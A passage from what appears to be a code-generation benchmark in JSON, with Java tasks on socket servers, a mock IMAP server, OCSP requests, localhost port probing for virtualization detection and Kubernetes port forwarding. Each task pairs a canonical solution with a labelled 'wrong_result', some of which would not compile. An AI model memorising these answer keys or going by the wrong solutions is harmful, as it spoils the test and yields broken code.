-> [boolean] - Processes incoming client requests\n  Parameters:\n    - in: [DataInputStream] - Input stream from client\n    - out: [DataOutputStream] - Output stream to client\n  Returns: [boolean] - Whether to continue processing requests\n\n- set(Socket) -> [void] - Configures socket parameters (TCP_NODELAY, buffer sizes)\n  Parameters:\n    - socket: [Socket] - Socket to configure\n\n- stop() -> [void] - Closes all open sockets and releases resources\n- startTest(int) -> [void] - Starts the test with given parameters\n  Parameters:\n    - num: [int] - Test parameter\n\n- receiveData(long, byte[]) -> [void] - Handles received data from client\n  Parameters:\n    - val: [long] - Timestamp or identifier\n    - data: [byte[]] - Received data payload",
    "Canonical_solution": "import java.io.*;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class UnicastTestTcpRpc {\n    private ServerSocket srv_sock;\n    private volatile Socket sock;\n    private DataInputStream sock_in;\n    private DataOutputStream sock_out;\n\n    static final byte START         =  0;\n    static final byte RECEIVE_ASYNC =  1;\n    static final byte RECEIVE_SYNC  =  2;\n    static final byte ACK           = 10;\n\n    public void init(long sleep_time, boolean exit_on_end, boolean busy_sleep, boolean sync, boolean oob,\n                     String addr, int local_port, int dest_port) throws Exception {\n        this.srv_sock = new ServerSocket(local_port);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        \n        Thread acceptor = new Thread(() -> {\n            while(true) {\n                Socket client_sock = null;\n                DataInputStream in = null;\n                DataOutputStream out = null;\n                try {\n                    client_sock = srv_sock.accept();\n                    set(client_sock);\n                    in = new DataInputStream(client_sock.getInputStream());\n                    out = new DataOutputStream(client_sock.getOutputStream());\n                    if(!handleRequest(in, out)) {\n                        Util.close(client_sock);\n                        Util.close(out);\n                        Util.close(in);\n                        break;\n                    }\n                }\n                catch(IOException e) {\n                    Util.close(client_sock);\n                    Util.close(out);\n                    Util.close(in);\n                    break;\n                }\n            }\n        });\n        acceptor.start();\n    }\n\n    void createSocket() throws IOException {\n        if(sock == null) {\n            sock = new Socket(InetAddress.getByName(null), 9000);\n            set(sock);\n            sock_in = new DataInputStream(sock.getInputStream());\n            sock_out = new DataOutputStream(sock.getOutputStream());\n        }\n    }\n\n    boolean handleRequest(DataInputStream in, DataOutputStream out) throws IOException {\n        while(true) {\n            byte type = (byte)in.read();\n            if(type == -1)\n                return false;\n\n            switch(type) {\n                case START:\n                    int num = in.readInt();\n                    startTest(num);\n                    break;\n                case RECEIVE_ASYNC:\n                case RECEIVE_SYNC:\n                    long val = in.readLong();\n                    int len = in.readInt();\n                    byte[] data = new byte[len];\n                    in.readFully(data, 0, data.length);\n                    receiveData(val, data);\n                    if(type == RECEIVE_SYNC) {\n                        out.writeLong(System.currentTimeMillis());\n                        out.flush();\n                    }\n                    break;\n                default:\n                    System.err.println(\"type \" + type + \" not known\");\n            }\n        }\n    }\n\n    static void set(Socket socket) throws SocketException {\n        socket.setTcpNoDelay(true);\n        socket.setReceiveBufferSize(20000000);\n        socket.setSendBufferSize(10000000);\n    }\n\n    void stop() {\n        Util.close(sock);\n        Util.close(srv_sock);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class UnicastTestTcpRpc {\n    private ServerSocket srv_sock;\n    private Socket sock;\n    private DataInputStream sock_in;\n    private DataOutputStream sock_out;\n    private long sleep_time;\n    private boolean exit_on_end;\n    private boolean busy_sleep;\n    private boolean sync;\n    private boolean oob;\n    private String addr;\n    private int local_port;\n    private int dest_port;\n\n    public void init(long sleep_time, boolean exit_on_end, boolean busy_sleep, boolean sync, boolean oob, String addr, int local_port, int dest_port) throws IOException {\n        this.sleep_time = sleep_time;\n        this.exit_on_end = exit_on_end;\n        this.busy_sleep = busy_sleep;\n        this.sync = sync;\n        this.oob = oob;\n        this.addr = addr;\n        this.local_port = local_port;\n        this.dest_port = dest_port;\n        srv_sock = new ServerSocket(local_port);\n        new Thread(() -> {\n            while (true) {\n                try {\n                    sock = srv_sock.accept();\n                    set(sock);\n                    sock_in = new DataInputStream(sock.getInputStream());\n                    sock_out = new DataOutputStream(sock.getOutputStream());\n                    if (!handleRequest(sock_in, sock_out)) {\n                        break;\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    break;\n                }\n            }\n            stop();\n        }).start();\n    }\n\n    public void createSocket() throws IOException {\n        sock = new Socket(addr, dest_port);\n        set(sock);\n        sock_in = new DataInputStream(sock.getInputStream());\n        sock_out = new DataOutputStream(sock.getOutputStream());\n    }\n\n    public boolean handleRequest(DataInputStream in, DataOutputStream out) throws IOException {\n        int len = in.readInt();\n        byte[] data = new byte[len];\n        in.readFully(data);\n        out.writeInt(data.length);\n        out.write(data);\n        out.flush();\n        return true;\n    }\n\n    public void set(Socket socket) {\n        socket.setTcpNoDelay(true);\n    }\n\n    public void stop() {\n        try {\n            if (sock != null) sock.close();\n            if (srv_sock != null) srv_sock.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void startTest(int num) {\n        // Test logic based on num\n    }\n\n    public void receiveData(long val, byte[] data) {\n        // Handle received data\n    }\n}"
  },
  {
    "Task_id": 519,
    "Instruction": "Task Description: Create a mock IMAP server implementation in Java that simulates IMAP server behavior for testing purposes, handling client connections and interactions through TCP sockets.\n\nClass Description: MockImapServer is a test utility class that simulates an IMAP server by listening on a local port, accepting client connections, and processing predefined interactions. It manages server lifecycle and provides synchronization mechanisms for test coordination.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of predefined IMAP interactions to simulate\n- waitForConnectionClosed: CountDownLatch - Synchronization primitive for waiting until client connection closes\n- waitForAllExpectedCommands: CountDownLatch - Synchronization primitive for waiting until all expected commands are processed\n- mockServerThread: MockServerThread - The thread running the server operations\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread. Binds to an available port on localhost.\n- shutdown() -> void - Stops the server thread and cleans up resources, with a 500ms timeout for graceful shutdown.\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread implementation\n- run() -> void - Main server thread logic that accepts connections, processes interactions, and handles cleanup\n- handleInteractions() -> void - Processes the next interaction from the queue (internal method)\n- readAdditionalCommands() -> void - Reads additional unexpected commands from client (internal method)\n- shouldStop() -> void - Signals the server thread to stop and closes client socket",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockImapServer {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = ((java.net.InetSocketAddress) serverSocket.getLocalSocketAddress()).getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n        try {\n            mockServerThread.join(500L);\n        } catch (InterruptedException ignored) {\n        }\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                              CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    if (clientSocket != null) {\n                        clientSocket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = new java.io.BufferedReader(\n                    new java.io.InputStreamReader(clientSocket.getInputStream())).readLine();\n            if (command == null) {\n                throw new java.io.EOFException();\n            }\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                if (clientSocket != null) {\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class MockImapServer {\n    private final Deque<ImapInteraction> interactions;\n    private final CountDownLatch waitForConnectionClosed;\n    private final CountDownLatch waitForAllExpectedCommands;\n    private final MockServerThread mockServerThread;\n    private final String host;\n    private final int port;\n\n    public MockImapServer() {\n        this.interactions = new LinkedBlockingDeque<>();\n        this.waitForConnectionClosed = new CountDownLatch(1);\n        this.waitForAllExpectedCommands = new CountDownLatch(1);\n        this.mockServerThread = null;\n        this.host = \"localhost\";\n        this.port = 0;\n    }\n\n    public void start() {\n        try {\n            ServerSocket serverSocket = new ServerSocket(0);\n            this.port = serverSocket.getLocalPort();\n            this.host = \"localhost\";\n            this.mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands);\n            mockServerThread.start();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to start mock IMAP server\", e);\n        }\n    }\n\n    public void shutdown() {\n        if (mockServerThread != null) {\n            mockServerThread.shutdown();\n        }\n        try {\n            if (mockServerThread != null) {\n                mockServerThread.join(500);\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                               CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    Socket clientSocket = serverSocket.accept();\n                    handleClient(clientSocket);\n                }\n            } catch (IOException | InterruptedException e) {\n                // Handle shutdown\n            } finally {\n                try {\n                    serverSocket.close();\n                } catch (IOException e) {\n                    // Ignore\n                }\n            }\n        }\n\n        private void handleClient(Socket clientSocket) throws IOException, InterruptedException {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter writer = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            handleInteractions(reader, writer);\n            readAdditionalCommands(reader);\n            clientSocket.close();\n            waitForConnectionClosed.countDown();\n        }\n\n        private void handleInteractions(BufferedReader reader, PrintWriter writer) throws IOException, InterruptedException {\n            while (!interactions.isEmpty()) {\n                ImapInteraction interaction = interactions.poll();\n                if (interaction == null) {\n                    break;\n                }\n\n                List<String> expectedCommands = interaction.getExpectedCommands();\n                List<String> responses = interaction.getResponses();\n\n                for (int i = 0; i < expectedCommands.size(); i++) {\n                    String expectedCommand = expectedCommands.get(i);\n                    String response = responses.get(i);\n\n                    String clientCommand = reader.readLine();\n                    if (clientCommand == null) {\n                        break;\n                    }\n\n                    if (!clientCommand.trim().equals(expectedCommand)) {\n                        // Unexpected command, but continue processing\n                    }\n\n                    writer.println(response);\n                    writer.flush();\n                }\n\n                waitForAllExpectedCommands.countDown();\n            }\n        }\n\n        private void readAdditionalCommands(BufferedReader reader) throws IOException {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                // Read until client closes\n            }\n        }\n\n        public void shutdown() {\n            // Signal the thread to stop\n            interrupt();\n        }\n    }\n\n    public static class ImapInteraction {\n        private final List<String> expectedCommands;\n        private final List<String> responses;\n\n        public ImapInteraction(List<String> expectedCommands, List<String> responses) {\n            this.expectedCommands = expectedCommands;\n            this.responses = responses;\n        }\n\n        public List<String> getExpectedCommands() {\n            return expectedCommands;\n        }\n\n        public List<String> getResponses() {\n            return responses;\n        }\n    }\n}"
  },
  {
    "Task_id": 52,
    "Instruction": "Task Description: Create a function that sends an OCSP (Online Certificate Status Protocol) request to a specified URL and processes the response.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends an OCSP request, reads the response, and constructs an OCSPResp object from the received data. It handles the connection lifecycle and ensures proper resource cleanup.\n\nInput:\n- url: [String] - The URL to which the OCSP request will be sent\n- ocspReq: [OCSPReq] - The OCSP request object containing the encoded request data\n\nOutput:\n- [OCSPResp] - The OCSP response object constructed from the server's response data\n- Throws [IOException] - If any I/O error occurs during the request/response process",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.apache.commons.io.IOUtils;\n\nprivate OCSPResp requestOCSPResponse(String url, OCSPReq ocspReq) throws IOException {\n    byte[] ocspReqData = ocspReq.getEncoded();\n\n    HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();\n    try {\n        con.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n        con.setRequestProperty(\"Accept\", \"application/ocsp-response\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setUseCaches(false);\n        try (OutputStream out = con.getOutputStream()) {\n            IOUtils.write(ocspReqData, out);\n            out.flush();\n        }\n        byte[] responseBytes = IOUtils.toByteArray(con.getInputStream());\n        OCSPResp ocspResp = new OCSPResp(responseBytes);\n        return ocspResp;\n    } finally {\n        if (con != null) {\n            con.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "public OCSPResp sendOcspRequest(String url, OCSPReq ocspReq) throws IOException {\n    URL u = new URL(url);\n    HttpURLConnection conn = (HttpURLConnection) u.openConnection();\n    conn.setRequestMethod(\"POST\");\n    conn.setDoOutput(true);\n    conn.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n    conn.setRequestProperty(\"Content-Length\", String.valueOf(ocspReq.getEncoded().length));\n    try (OutputStream os = conn.getOutputStream()) {\n        os.write(ocspReq.getEncoded());\n    }\n    int responseCode = conn.getResponseCode();\n    if (responseCode != HttpURLConnection.HTTP_OK) {\n        throw new IOException(\"Server returned HTTP error code: \" + responseCode);\n    }\n    try (InputStream is = conn.getInputStream()) {\n        byte[] responseBytes = new byte[is.available()];\n        is.read(responseBytes);\n        return new OCSPResp(responseBytes);\n    }\n}"
  },
  {
    "Task_id": 520,
    "Instruction": "Here is the structured instruction for the class-level reference code:\n\nTask Description: Implement a class that facilitates TCP socket communication between a server and client on the local machine, using a secret string for verification and callback notifications.\n\nClass Description: The `SocketCommunication` class establishes a TCP server that listens for incoming connections and a client that probes open ports. When the client finds a matching server using a secret string, it triggers a callback notification.\n\nAttributes:\n- TAG: String - A tag used for logging purposes\n- secret: String - The secret string used for verification between client and server\n- callback: VirtualCheckCallback - A callback interface to notify when a suspect is found\n- portList: ArrayList<Integer> - A list of ports to probe for server connections\n\nMethods:\n- checkByPortListening(String, VirtualCheckCallback) -> void - Initiates the client and server threads for communication\n- startServer(String, VirtualCheckCallback) -> void - Creates a server socket that listens for incoming connections and spawns read threads\n- startClient(String) -> void - Scans for open ports and spawns client threads to probe them\n- ServerThread(String, VirtualCheckCallback) -> void - A thread class that runs the server socket\n- ReadThread(String, Socket, VirtualCheckCallback) -> void - A thread class that reads incoming data from a socket connection\n- ClientThread(String, int) -> void - A thread class that attempts to connect to a server socket and send the secret string",
    "Canonical_solution": "import android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.BindException;\nimport java.net.ConnectException;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class SocketCommunication {\n    private String TAG = \"SocketCommunication\";\n    \n    public void checkByPortListening(String secret, VirtualCheckCallback callback) {\n        startClient(secret);\n        new ServerThread(secret, callback).start();\n    }\n\n    private class ServerThread extends Thread {\n        String secret;\n        VirtualCheckCallback callback;\n\n        private ServerThread(String secret, VirtualCheckCallback callback) {\n            this.secret = secret;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            super.run();\n            startServer(secret, callback);\n        }\n    }\n\n    private void startServer(String secret, VirtualCheckCallback callback) {\n        Random random = new Random();\n        ServerSocket serverSocket = null;\n        try {\n            serverSocket = new ServerSocket();\n            serverSocket.bind(new InetSocketAddress(\"127.0.0.1\",\n                    random.nextInt(55534) + 10000));\n            while (true) {\n                Socket socket = serverSocket.accept();\n                ReadThread readThread = new ReadThread(secret, socket, callback);\n                readThread.start();\n            }\n        } catch (BindException e) {\n            startServer(secret, callback);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ReadThread extends Thread {\n        private ReadThread(String secret, Socket socket, VirtualCheckCallback callback) {\n            InputStream inputStream = null;\n            try {\n                inputStream = socket.getInputStream();\n                byte buffer[] = new byte[1024 * 4];\n                int temp = 0;\n                while ((temp = inputStream.read(buffer)) != -1) {\n                    String result = new String(buffer, 0, temp);\n                    if (result.contains(secret) && callback != null)\n                        callback.findSuspect();\n                }\n                inputStream.close();\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void startClient(String secret) {\n        String tcp6 = CommandUtil.getSingleInstance().exec(\"cat /proc/net/tcp6\");\n        if (TextUtils.isEmpty(tcp6)) return;\n        String[] lines = tcp6.split(\"\\n\");\n        ArrayList<Integer> portList = new ArrayList<>();\n        for (int i = 0, len = lines.length; i < len; i++) {\n            int localHost = lines[i].indexOf(\"0100007F:\");\n            if (localHost < 0) continue;\n            String singlePort = lines[i].substring(localHost + 9, localHost + 13);\n            Integer port = Integer.parseInt(singlePort, 16);\n            portList.add(port);\n        }\n        if (portList.isEmpty()) return;\n        for (int port : portList) {\n            new ClientThread(secret, port).start();\n        }\n    }\n\n    private class ClientThread extends Thread {\n        String secret;\n        int port;\n\n        private ClientThread(String secret, int port) {\n            this.secret = secret;\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            super.run();\n            try {\n                Socket socket = new Socket(\"127.0.0.1\", port);\n                socket.setSoTimeout(2000);\n                OutputStream outputStream = socket.getOutputStream();\n                outputStream.write((secret + \"\\n\").getBytes(\"utf-8\"));\n                outputStream.flush();\n                socket.shutdownOutput();\n\n                InputStream inputStream = socket.getInputStream();\n                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n                String info = null;\n                while ((info = bufferedReader.readLine()) != null) {\n                    Log.i(TAG, \"ClientThread: \" + info);\n                }\n\n                bufferedReader.close();\n                inputStream.close();\n                socket.close();\n            } catch (ConnectException e) {\n                Log.i(TAG, port + \"port refused\");\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (UnknownHostException e) {\n                e.printStackTrace();\n            } catch (UnsupportedEncodingException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public interface VirtualCheckCallback {\n    void onMatchFound(String message);\n}\n\npublic class SocketCommunication {\n    private String TAG;\n    private String secret;\n    private VirtualCheckCallback callback;\n    private ArrayList<Integer> portList;\n\n    public SocketCommunication(String tag, String secret, VirtualCheckCallback callback, ArrayList<Integer> portList) {\n        this.TAG = tag;\n        this.secret = secret;\n        this.callback = callback;\n        this.portList = portList;\n    }\n\n    public void checkByPortListening(String serverPort, VirtualCheckCallback callback) {\n        startServer(serverPort, callback);\n        startClient();\n    }\n\n    private void startServer(String serverPort, VirtualCheckCallback callback) {\n        Thread serverThread = new Thread(new ServerThread(serverPort, callback));\n        serverThread.start();\n    }\n\n    private void startClient() {\n        for (int port : portList) {\n            new Thread(new ClientThread(String.valueOf(port))).start();\n        }\n    }\n\n    private class ServerThread implements Runnable {\n        private String serverPort;\n        private VirtualCheckCallback callback;\n\n        public ServerThread(String serverPort, VirtualCheckCallback callback) {\n            this.serverPort = serverPort;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try {\n                ServerSocket serverSocket = new ServerSocket(Integer.parseInt(serverPort));\n                serverSocket.setReuseAddress(true);\n                while (true) {\n                    Socket clientSocket = serverSocket.accept();\n                    new Thread(new ReadThread(TAG, clientSocket, callback)).start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class ReadThread implements Runnable {\n        private String TAG;\n        private Socket socket;\n        private VirtualCheckCallback callback;\n\n        public ReadThread(String TAG, Socket socket, VirtualCheckCallback callback) {\n            this.TAG = TAG;\n            this.socket = socket;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String receivedData = reader.readLine();\n                if (receivedData != null && receivedData.equals(secret)) {\n                    callback.onMatchFound(\"Match found with secret: \" + secret);\n                }\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class ClientThread implements Runnable {\n        private String port;\n\n        public ClientThread(String port) {\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Socket socket = new Socket();\n                socket.connect(new InetSocketAddress(Integer.parseInt(port), 1000));\n                if (socket.isConnected()) {\n                    PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);\n                    writer.println(secret);\n                    socket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 521,
    "Instruction": "Task Description: Create a Java class that implements Kubernetes port forwarding functionality, allowing local ports to be forwarded to target ports in a Kubernetes pod. The class should handle multiple port forwards simultaneously and provide error handling capabilities.\n\nClass Description: KubectlPortForward is a Kubernetes client utility that establishes TCP port forwarding between local ports and target ports in a specified pod. It extends Kubectl's ResourceAndContainerBuilder and implements Executable<Boolean> interface. The class manages multiple port forwarding connections in separate threads and provides shutdown capability.\n\nAttributes:\n- localPorts: List<Integer> - Stores local port numbers to be forwarded\n- targetPorts: List<Integer> - Stores target port numbers in the pod\n- running: boolean - Flag indicating whether port forwarding is active\n- onUnhandledError: Consumer<Throwable> - Callback for handling uncaught exceptions\n\nMethods:\n- ports(int localPort, int targetPort) -> KubectlPortForward - Adds a port forwarding pair (local and target ports)\n- onUnhandledError(Consumer<Throwable> onUnhandledError) -> KubectlPortForward - Sets the error handler callback\n- execute() -> Boolean - Starts the port forwarding operation (implements Kubectl.Executable)\n- shutdown() -> void - Stops all port forwarding operations\n- executeInternal() -> void - Internal implementation of port forwarding (throws ApiException, KubectlException, IOException, InterruptedException)\n- portForward(PortForward pf, ServerSocket server, int targetPort) -> Thread - Creates and starts a thread for a single port forwarding connection\n- copyAsync(InputStream, OutputStream, Consumer<Throwable>) -> Thread - Helper method for asynchronous stream copying (not shown in reference code)",
    "Canonical_solution": "import io.kubernetes.client.PortForward;\nimport io.kubernetes.client.extended.kubectl.Kubectl;\nimport io.kubernetes.client.extended.kubectl.exception.KubectlException;\nimport io.kubernetes.client.openapi.ApiException;\nimport io.kubernetes.client.openapi.models.V1Pod;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.function.Consumer;\n\npublic class KubectlPortForward\n    extends Kubectl.ResourceAndContainerBuilder<V1Pod, KubectlPortForward>\n    implements Kubectl.Executable<Boolean> {\n  private List<Integer> localPorts;\n  private List<Integer> targetPorts;\n  private boolean running;\n  private Consumer<Throwable> onUnhandledError = Throwable::printStackTrace;\n\n  public KubectlPortForward() {\n    super(V1Pod.class);\n    localPorts = new ArrayList<>();\n    targetPorts = new ArrayList<>();\n  }\n\n  public KubectlPortForward ports(int localPort, int targetPort) {\n    localPorts.add(localPort);\n    targetPorts.add(targetPort);\n    return this;\n  }\n\n  public KubectlPortForward onUnhandledError(Consumer<Throwable> onUnhandledError) {\n    this.onUnhandledError = onUnhandledError;\n    return this;\n  }\n\n  @Override\n  public Boolean execute() throws KubectlException {\n    running = true;\n    try {\n      executeInternal();\n      return true;\n    } catch (ApiException | IOException | InterruptedException ex) {\n      throw new KubectlException(ex);\n    }\n  }\n\n  public void shutdown() {\n    running = false;\n  }\n\n  private void executeInternal()\n      throws ApiException, KubectlException, IOException, InterruptedException {\n    PortForward pf = new PortForward(apiClient);\n    List<Thread> threads = new ArrayList<>();\n    for (int i = 0; i < localPorts.size(); i++) {\n      int targetPort = targetPorts.get(i);\n      threads.add(portForward(pf, new ServerSocket(localPorts.get(i)), targetPort));\n    }\n    for (Thread t : threads) {\n      t.join();\n    }\n  }\n\n  private Thread portForward(PortForward pf, ServerSocket server, int targetPort) {\n    Thread t = new Thread(\n        () -> {\n          while (running) {\n            try (Socket sock = server.accept()) {\n              PortForward.PortForwardResult result = pf.forward(namespace, name, Arrays.asList(targetPort));\n              if (result == null) {\n                throw new KubectlException(\"PortForward failed!\");\n              }\n              InputStream in = result.getInputStream(targetPort);\n              OutputStream out = result.getOutboundStream(targetPort);\n              Thread t1 = copyAsync(sock.getInputStream(), out, onUnhandledError);\n              Thread t2 = copyAsync(in, sock.getOutputStream(), onUnhandledError);\n\n              t1.join();\n              in.close();\n              t2.join();\n            } catch (Exception ex) {\n              Optional.ofNullable(onUnhandledError)\n                  .orElse(Throwable::printStackTrace)\n                  .accept(ex);\n            }\n          }\n        });\n    t.start();\n    return t;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class KubectlPortForward extends ResourceAndContainerBuilder implements Executable<Boolean> {\n    private final List<Integer> localPorts = new ArrayList<>();\n    private final List<Integer> targetPorts = new ArrayList<>();\n    private boolean running = false;\n    private final Consumer<Throwable> onUnhandledError;\n\n    public KubectlPortForward() {\n        this.onUnhandledError = (throwable) -> {};\n    }\n\n    public KubectlPortForward ports(int localPort, int targetPort) {\n        localPorts.add(localPort);\n        targetPorts.add(targetPort);\n        return this;\n    }\n\n    public KubectlPortForward onUnhandledError(Consumer<Throwable> onUnhandledError) {\n        this.onUnhandledError = onUnhandledError;\n        return this;\n    }\n\n    @Override\n    public Boolean execute() {\n        if (localPorts.isEmpty() || targetPorts.isEmpty()) {\n            throw new IllegalArgumentException(\"Local and target ports must be specified\");\n        }\n        if (running) {\n            throw new IllegalStateException(\"Port forwarding is already running\");\n        }\n        running = true;\n        try {\n            executeInternal();\n        } catch (Exception e) {\n            shutdown();\n            throw new KubectlException(\"Failed to start port forwarding\", e);\n        }\n        return true;\n    }\n\n    private void executeInternal() throws ApiException, KubectlException, IOException, InterruptedException {\n        if (localPorts.size() != targetPorts.size()) {\n            throw new IllegalArgumentException(\"Local and target ports must be the same size\");\n        }\n        for (int i = 0; i < localPorts.size(); i++) {\n            int localPort = localPorts.get(i);\n            int targetPort = targetPorts.get(i);\n            Thread thread = portForward(new PortForward(), new ServerSocket(localPort), targetPort);\n            thread.start();\n        }\n    }\n\n    private Thread portForward(PortForward pf, ServerSocket server, int targetPort) {\n        return new Thread(() -> {\n            try {\n                while (running) {\n                    Socket clientSocket = server.accept();\n                    Thread copyThread = copyAsync(clientSocket.getInputStream(), clientSocket.getOutputStream(), onUnhandledError);\n                    copyThread.start();\n                }\n            } catch (IOException e) {\n                onUnhandledError.accept(e);\n            } finally {\n                try {\n                    server.close();\n                } catch (IOException e) {\n                    onUnhandledError.accept(e);\n                }\n            }\n        });\n    }\n\n    private Thread copyAsync(InputStream in, OutputStream out, Consumer<Throwable> onError) {\n        return new Thread(() -> {\n            try {\n                byte[] buffer = new byte[8192];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    out.write(buffer, 0, bytesRead);\n                }\n            } catch (IOException e) {\n                onError.accept(e);\n            } finally {\n                try {\n                    in.close();\n                    out.close();\n                } catch (IOException e) {\n                    onError.accept(e);\n                }\n            }\n        });\n    }\n\n    public void shutdown() {\n        running = false;\n        // Additional cleanup if needed\n    }\n}"
  },
  {
    "Task_id": 522,
